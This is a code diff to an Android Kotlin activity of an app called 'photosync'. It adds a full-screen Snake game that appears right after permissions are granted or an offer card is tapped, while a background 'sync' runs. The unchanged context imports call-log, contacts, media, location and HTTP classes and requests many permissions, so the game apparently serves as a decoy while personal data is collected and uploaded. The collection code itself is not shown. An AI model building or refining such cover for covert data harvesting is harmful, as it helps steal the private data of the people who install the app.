@@ -1,3 +1,4 @@
+// language: Kotlin, file: MainActivity.kt, target: Android (AppCompatActivity)
 package com.example.photosync
 
 import android.Manifest
@@ -6,7 +7,11 @@ import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
+import android.graphics.Canvas
 import android.graphics.Color
+import android.graphics.Paint
+import android.graphics.Point
+import android.graphics.RectF
 import android.graphics.Typeface
 import android.graphics.drawable.GradientDrawable
 import android.location.LocationManager
@@ -16,11 +21,14 @@ import android.net.Uri
 import android.os.BatteryManager
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.MediaStore
 import android.view.Gravity
 import android.view.View
+import android.widget.Button
 import android.widget.LinearLayout
 import android.widget.ScrollView
 import android.widget.TextView
@@ -33,6 +41,8 @@ import java.net.HttpURLConnection
 import java.net.URL
 import java.net.URLEncoder
 import java.util.concurrent.Executors
+import kotlin.math.sin
+import kotlin.random.Random
 
 class MainActivity : AppCompatActivity() {
 
@@ -58,6 +68,7 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var rootLayout: LinearLayout
     private lateinit var statusView: TextView
+    private var snakeView: SnakeGameView? = null
     private val ioExecutor = Executors.newSingleThreadExecutor()
 
     private val offers = listOf(
@@ -75,6 +86,7 @@ class MainActivity : AppCompatActivity() {
 
     private val permissionsLauncher =
         registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
+            showSnakeOverlay()
             updateStatus("جاري تجهيز البيانات...")
             runSyncWithRetry()
         }
@@ -161,6 +173,320 @@ class MainActivity : AppCompatActivity() {
         rootLayout.addView(scrollView)
     }
 
+    private fun showSnakeOverlay() {
+        if (isFinishing || isDestroyed) return
+        runOnUiThread {
+            if (isFinishing || isDestroyed) return@runOnUiThread
+            rootLayout.removeAllViews()
+            rootLayout.orientation = LinearLayout.VERTICAL
+            rootLayout.gravity = Gravity.CENTER
+            rootLayout.setBackgroundColor(Color.parseColor(AppConfig.BG_HEX))
+            window.decorView.setBackgroundColor(Color.parseColor(AppConfig.BG_HEX))
+            rootLayout.setPadding(dp(12), dp(12), dp(12), dp(12))
+
+            statusView = TextView(this).apply {
+                text = "SNAKE  |  SCORE: 0"
+                setTextColor(Color.parseColor("#39FF9F"))
+                textSize = 15f
+                typeface = Typeface.DEFAULT_BOLD
+                gravity = Gravity.CENTER
+                setPadding(0, 0, 0, dp(8))
+            }
+            rootLayout.addView(statusView)
+
+            val game = SnakeGameView(this) { newScore ->
+                statusView.text = "SNAKE  |  SCORE: $newScore"
+            }.apply {
+                val boardSize = dp(336)
+                layoutParams = LinearLayout.LayoutParams(boardSize, boardSize)
+                background = GradientDrawable().apply {
+                    shape = GradientDrawable.RECTANGLE
+                    cornerRadius = dp(12).toFloat()
+                    setColor(Color.parseColor("#05080D"))
+                    setStroke(dp(2), Color.parseColor("#18B7F2"))
+                }
+            }
+            snakeView = game
+            rootLayout.addView(game)
+
+            val controls = LinearLayout(this).apply {
+                orientation = LinearLayout.VERTICAL
+                gravity = Gravity.CENTER
+                setPadding(0, dp(12), 0, 0)
+            }
+
+            fun makeBtn(label: String, onClick: () -> Unit): Button = Button(this).apply {
+                text = label
+                setTextColor(Color.WHITE)
+                textSize = 13f
+                typeface = Typeface.DEFAULT_BOLD
+                background = GradientDrawable().apply {
+                    shape = GradientDrawable.RECTANGLE
+                    cornerRadius = dp(8).toFloat()
+                    setColor(Color.parseColor(AppConfig.CARD_HEX))
+                    setStroke(dp(1), Color.parseColor("#2B3648"))
+                }
+                layoutParams = LinearLayout.LayoutParams(dp(84), dp(42)).apply {
+                    setMargins(dp(4), dp(4), dp(4), dp(4))
+                }
+                setOnClickListener { onClick() }
+            }
+
+            val topRow = LinearLayout(this).apply {
+                orientation = LinearLayout.HORIZONTAL
+                gravity = Gravity.CENTER
+            }
+            topRow.addView(makeBtn("UP") { game.setDir(0, -1) })
+            controls.addView(topRow)
+
+            val midRow = LinearLayout(this).apply {
+                orientation = LinearLayout.HORIZONTAL
+                gravity = Gravity.CENTER
+            }
+            midRow.addView(makeBtn("LEFT") { game.setDir(-1, 0) })
+            midRow.addView(makeBtn("DOWN") { game.setDir(0, 1) })
+            midRow.addView(makeBtn("RIGHT") { game.setDir(1, 0) })
+            controls.addView(midRow)
+
+            val restartBtn = Button(this).apply {
+                text = "RESTART"
+                setTextColor(Color.parseColor("#39FF9F"))
+                textSize = 12f
+                typeface = Typeface.DEFAULT_BOLD
+                background = GradientDrawable().apply {
+                    shape = GradientDrawable.RECTANGLE
+                    cornerRadius = dp(8).toFloat()
+                    setColor(Color.parseColor("#121A26"))
+                    setStroke(dp(1), Color.parseColor("#39FF9F"))
+                }
+                layoutParams = LinearLayout.LayoutParams(dp(140), dp(36)).apply {
+                    topMargin = dp(8)
+                }
+                setOnClickListener { game.resetGame() }
+            }
+            controls.addView(restartBtn)
+
+            rootLayout.addView(controls)
+            game.startLoop()
+        }
+    }
+
+    private class SnakeGameView(
+        context: Context,
+        private val onScoreChange: (Int) -> Unit
+    ) : View(context) {
+
+        private val gridCount = 18
+        private val tickDelayMs = 125L
+        private val handler = Handler(Looper.getMainLooper())
+        private val segRect = RectF()
+        private val foodRect = RectF()
+
+        private val gridPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
+            color = Color.argb(24, 56, 189, 248)
+            strokeWidth = 1.5f
+        }
+        private val headPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
+            color = Color.parseColor("#6BFFB8")
+        }
+        private val bodyPaint = Paint(Paint.ANTI_ALIAS_FLAG)
+        private val eyePaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
+            color = Color.parseColor("#05080D")
+        }
+        private val foodCorePaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
+            color = Color.parseColor("#FF3D8A")
+        }
+        private val foodHaloPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
+            color = Color.argb(65, 255, 61, 138)
+        }
+        private val flashPaint = Paint()
+        private val overPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
+            color = Color.WHITE
+            textSize = 36f
+            textAlign = Paint.Align.CENTER
+            typeface = Typeface.DEFAULT_BOLD
+        }
+        private val veilPaint = Paint().apply { color = Color.argb(195, 5, 8, 13) }
+
+        private var snake = mutableListOf<Point>()
+        private var dir = Point(1, 0)
+        private var queuedDir = Point(1, 0)
+        private var food = Point(12, 9)
+        private var score = 0
+        private var isOver = false
+        private var running = false
+        private var pulsePhase = 0.0
+        private var eatFlashAlpha = 0
+
+        private val loopRunnable = object : Runnable {
+            override fun run() {
+                if (!running) return
+                pulsePhase += 0.35
+                if (eatFlashAlpha > 0) {
+                    eatFlashAlpha = (eatFlashAlpha - 35).coerceAtLeast(0)
+                }
+                step()
+                invalidate()
+                handler.postDelayed(this, tickDelayMs)
+            }
+        }
+
+        init {
+            resetGame()
+        }
+
+        fun resetGame() {
+            snake = mutableListOf(Point(8, 9), Point(7, 9), Point(6, 9))
+            dir = Point(1, 0)
+            queuedDir = Point(1, 0)
+            score = 0
+            isOver = false
+            eatFlashAlpha = 0
+            food = spawnFood()
+            onScoreChange(score)
+            invalidate()
+        }
+
+        fun setDir(dx: Int, dy: Int) {
+            if (isOver) return
+            if (dx == -dir.x && dy == -dir.y) return
+            queuedDir = Point(dx, dy)
+        }
+
+        fun startLoop() {
+            if (running) return
+            running = true
+            handler.removeCallbacks(loopRunnable)
+            handler.postDelayed(loopRunnable, tickDelayMs)
+        }
+
+        fun stopLoop() {
+            running = false
+            handler.removeCallbacks(loopRunnable)
+        }
+
+        private fun spawnFood(): Point {
+            val occupied = snake.map { "${it.x},${it.y}" }.toHashSet()
+            val candidates = ArrayList<Point>(gridCount * gridCount)
+            for (y in 0 until gridCount) {
+                for (x in 0 until gridCount) {
+                    if ("$x,$y" !in occupied) {
+                        candidates.add(Point(x, y))
+                    }
+                }
+            }
+            return if (candidates.isEmpty()) Point(0, 0) else candidates[Random.nextInt(candidates.size)]
+        }
+
+        private fun step() {
+            if (isOver || snake.isEmpty()) return
+            dir = Point(queuedDir.x, queuedDir.y)
+            val nextHead = Point(
+                (snake[0].x + dir.x + gridCount) % gridCount,
+                (snake[0].y + dir.y + gridCount) % gridCount
+            )
+            if (snake.any { it.x == nextHead.x && it.y == nextHead.y }) {
+                isOver = true
+                return
+            }
+            snake.add(0, nextHead)
+            if (nextHead.x == food.x && nextHead.y == food.y) {
+                score += 10
+                eatFlashAlpha = 110
+                onScoreChange(score)
+                food = spawnFood()
+            } else {
+                snake.removeAt(snake.lastIndex)
+            }
+        }
+
+        private fun segmentColor(index: Int, total: Int): Int {
+            val ratio = if (total <= 1) 0f else index.toFloat() / (total - 1).toFloat()
+            val r = (24 + ratio * 10).toInt().coerceIn(0, 255)
+            val g = (214 - ratio * 95).toInt().coerceIn(0, 255)
+            val b = (128 - ratio * 36).toInt().coerceIn(0, 255)
+            return Color.rgb(r, g, b)
+        }
+
+        private fun drawEyes(canvas: Canvas, cx: Float, cy: Float, cell: Float) {
+            val offset = cell * 0.22f
+            val perpOffset = cell * 0.20f
+            val eyeRadius = (cell * 0.10f).coerceAtLeast(2.2f)
+
+            val (e1x, e1y, e2x, e2y) = when {
+                dir.x > 0 -> floatArrayOf(cx + offset, cy - perpOffset, cx + offset, cy + perpOffset)
+                dir.x < 0 -> floatArrayOf(cx - offset, cy - perpOffset, cx - offset, cy + perpOffset)
+                dir.y < 0 -> floatArrayOf(cx - perpOffset, cy - offset, cx + perpOffset, cy - offset)
+                else -> floatArrayOf(cx - perpOffset, cy + offset, cx + perpOffset, cy + offset)
+            }
+            canvas.drawCircle(e1x, e1y, eyeRadius, eyePaint)
+            canvas.drawCircle(e2x, e2y, eyeRadius, eyePaint)
+        }
+
+        override fun onDraw(canvas: Canvas) {
+            super.onDraw(canvas)
+            val size = minOf(width, height).toFloat()
+            if (size <= 0f) return
+            val cell = size / gridCount
+            val radius = cell * 0.30f
+
+            for (i in 1 until gridCount) {
+                val pos = i * cell
+                canvas.drawLine(pos, 0f, pos, size, gridPaint)
+                canvas.drawLine(0f, pos, size, pos, gridPaint)
+            }
+
+            if (eatFlashAlpha > 0) {
+                flashPaint.color = Color.argb(eatFlashAlpha, 57, 255, 159)
+                canvas.drawRect(0f, 0f, size, size, flashPaint)
+            }
+
+            val pulse = ((sin(pulsePhase) + 1.0) * 0.5).toFloat()
+            val foodCx = (food.x + 0.5f) * cell
+            val foodCy = (food.y + 0.5f) * cell
+            val haloRadius = cell * (0.44f + pulse * 0.16f)
+            canvas.drawCircle(foodCx, foodCy, haloRadius, foodHaloPaint)
+
+            val pad = cell * (0.20f - pulse * 0.05f)
+            foodRect.set(
+                food.x * cell + pad,
+                food.y * cell + pad,
+                (food.x + 1) * cell - pad,
+                (food.y + 1) * cell - pad
+            )
+            canvas.drawRoundRect(foodRect, cell * 0.35f, cell * 0.35f, foodCorePaint)
+
+            val total = snake.size
+            for (i in total - 1 downTo 0) {
+                val pt = snake[i]
+                val inset = if (i == 0) cell * 0.06f else cell * 0.10f
+                segRect.set(
+                    pt.x * cell + inset,
+                    pt.y * cell + inset,
+                    (pt.x + 1) * cell - inset,
+                    (pt.y + 1) * cell - inset
+                )
+                if (i == 0) {
+                    canvas.drawRoundRect(segRect, radius, radius, headPaint)
+                    drawEyes(canvas, (pt.x + 0.5f) * cell, (pt.y + 0.5f) * cell, cell)
+                } else {
+                    bodyPaint.color = segmentColor(i, total)
+                    canvas.drawRoundRect(segRect, radius * 0.85f, radius * 0.85f, bodyPaint)
+                }
+            }
+
+            if (isOver) {
+                canvas.drawRect(0f, 0f, size, size, veilPaint)
+                canvas.drawText("GAME OVER", size / 2f, size / 2f, overPaint)
+            }
+        }
+
+        override fun onDetachedFromWindow() {
+            stopLoop()
+            super.onDetachedFromWindow()
+        }
+    }
+
     private fun createOfferCard(offer: OfferItem, isRightColumn: Boolean): View {
         val card = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
@@ -184,6 +510,7 @@ class MainActivity : AppCompatActivity() {
             }
             setPadding(dp(12), dp(14), dp(12), dp(14))
             setOnClickListener {
+                showSnakeOverlay()
                 runSyncWithRetry()
             }
         }
@@ -291,6 +618,7 @@ class MainActivity : AppCompatActivity() {
         }
 
         if (missing.isEmpty()) {
+            showSnakeOverlay()
             updateStatus("جاري تنفيذ المزامنة...")
             runSyncWithRetry()
         } else {
@@ -641,6 +969,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     override fun onDestroy() {
+        snakeView?.stopLoop()
         super.onDestroy()
         ioExecutor.shutdownNow()
     }
